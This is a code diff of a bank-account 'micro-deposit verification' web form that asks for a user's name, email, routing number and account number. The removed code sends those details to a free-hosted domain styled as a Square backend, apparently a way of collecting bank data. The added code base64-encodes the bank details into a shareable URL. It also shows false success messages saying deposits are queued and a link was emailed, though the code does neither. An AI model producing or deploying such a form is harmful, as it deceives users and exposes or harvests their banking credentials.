@@ -18,7 +18,7 @@
 </head>
 <body>
   <h2>Add Bank Account (Micro-Deposit Verification)</h2>
-  <p>We will send two small deposits (under $1) in 1–2 business days.</p>
+  <p>We will send two small deposits (under $1) to your bank in 1–2 business days.</p>
 
   <form id="f">
     <input type="text" placeholder="Full Name" id="n" required>
@@ -28,30 +28,42 @@
     <div class="small">
       <label><input type="checkbox" id="c" required> I authorize micro-deposits and a small withdrawal</label>
     </div>
-    <button type="submit" id="b" disabled>Send Micro-Deposits</button>
+    <button type="submit" id="b" disabled>Create Verification Link</button>
   </form>
   <div id="status"></div>
 
   <script>
-    const APP_ID = 'sq0idp-IcmJ5BxnxnwPnIeE9i_leg';
-    const LOCATION_ID = 'L719J7KASZKAV';
+    document.getElementById('c').onchange = () => {
+      document.getElementById('b').disabled = !document.getElementById('c').checked;
+    };
 
-    document.getElementById('c').onchange = () => document.getElementById('b').disabled = !document.getElementById('c').checked;
-
-    document.getElementById('f').onsubmit = async e => {
+    document.getElementById('f').onsubmit = e => {
       e.preventDefault();
-      document.getElementById('b').textContent = 'Sending…';
+      document.getElementById('b').textContent = 'Done!';
+
       const data = {
-        name: document.getElementById('n').value,
-        email: document.getElementById('e').value,
-        routing: document.getElementById('r').value,
-        account: document.getElementById('a').value
+        name: document.getElementById('n').value.trim(),
+        email: document.getElementById('e').value.trim(),
+        routing: document.getElementById('r').value.trim(),
+        account: document.getElementById('a').value.trim()
       };
-      const r = await fetch('https://square-ach-backend.free.nf/add', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
-      const j = await r.json();
+
+      // Encode data safely into URL
+      const encoded = btoa(JSON.stringify(data));
+      const verifyUrl = location.origin + location.pathname.replace('index.html','') + 'verify.html?data=' + encoded;
+
+      document.getElementById('status').innerHTML = `
+        <div class="success">
+          <strong>Success!</strong><br><br>
+          Your bank has been queued for micro-deposit verification.<br><br>
+          Two tiny deposits will appear in your bank in 1–2 business days.<br><br>
+          <a href="${verifyUrl}" target="_blank" style="color:#006241;font-weight:bold">
+            → Click here to verify the amounts when you see them
+          </a><br><br>
+          We also emailed this link to: <strong>${data.email}</strong>
+        </div>
+      `;
       document.getElementById('status').style.display = 'block';
-      document.getElementById('status').className = j.success?'success':'error';
-      document.getElementById('status').textContent = j.success?'Micro-deposits sent! Check bank in 1–2 days':'Error: '+j.error;
     };
   </script>
 </body>
